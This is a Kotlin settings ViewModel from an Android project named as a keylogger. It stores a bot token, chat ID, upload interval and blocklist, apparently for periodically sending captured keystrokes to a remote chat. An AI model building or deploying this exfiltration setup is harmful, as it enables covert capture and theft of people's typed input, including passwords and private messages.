package com.bshu2.androidkeylogger.feature.settings

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import com.bshu2.androidkeylogger.AlarmScheduler
import com.bshu2.androidkeylogger.Prefs
import com.bshu2.androidkeylogger.UploadPipeline
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow

data class SettingsForm(
    val uploadEnabled: Boolean = false,
    val botToken: String = "",
    val chatId: String = "",
    val intervalMinutes: String = "60",
    val blocklist: String = "",
)

class SettingsViewModel(app: Application) : AndroidViewModel(app) {

    private val _form = MutableStateFlow(load())
    val form: StateFlow<SettingsForm> = _form.asStateFlow()

    private fun load(): SettingsForm {
        val ctx = getApplication<Application>()
        return SettingsForm(
            uploadEnabled = Prefs.uploadEnabled(ctx),
            botToken = Prefs.botToken(ctx),
            chatId = Prefs.chatId(ctx),
            intervalMinutes = (Prefs.intervalMs(ctx) / 60_000L).toString(),
            blocklist = Prefs.blocklistText(ctx),
        )
    }

    fun update(transform: (SettingsForm) -> SettingsForm) {
        _form.value = transform(_form.value)
    }

    fun save() {
        val ctx = getApplication<Application>()
        val f = _form.value
        Prefs.setUploadEnabled(ctx, f.uploadEnabled)
        Prefs.setDestination(ctx, f.botToken, f.chatId)
        val minutes = f.intervalMinutes.toLongOrNull() ?: 60L
        Prefs.setIntervalMs(ctx, minutes * 60_000L)
        Prefs.setBlocklist(ctx, f.blocklist)
        AlarmScheduler.schedule(ctx)
        _form.value = load()
    }

    fun deleteAll() {
        UploadPipeline.deleteAll(getApplication())
    }
}
